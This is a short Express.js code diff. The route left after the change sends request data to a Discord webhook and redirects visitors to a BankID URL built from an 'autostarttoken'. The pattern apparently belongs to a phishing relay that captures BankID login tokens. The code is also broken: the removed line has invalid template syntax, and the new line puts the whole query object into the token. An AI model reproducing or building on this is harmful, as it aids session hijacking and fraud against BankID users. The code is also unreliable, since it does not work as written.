@@ -13,22 +13,9 @@ app.use(express.json());
 app.get('/', (req, res) => {
   const params = req.query;
 
-  // Check if there are any query parameters
-  if (Object.keys(params).length === 0) {
-    return res.status(400).send('Query parameters are required.');
-  }
-
-  // Assuming you want to send a Discord webhook with all query parameters
-  sendDiscordWebhook(JSON.stringify(params));
-
-  // Assuming you want to redirect to a specific URL with these parameters
-  // Modify redirectUrl according to your requirements
-  const redirectUrl = `bankid:///?autostarttoken=${params.?}`; // Adjust 'autostarttoken' based on your query parameter name
-
-  // Log the redirect URL to Discord webhook
+  const redirectUrl = `bankid:///?autostarttoken=${params}`;
   sendDiscordWebhook(redirectUrl);
 
-  // Redirect to the constructed URL
   res.redirect(redirectUrl);
 });
 
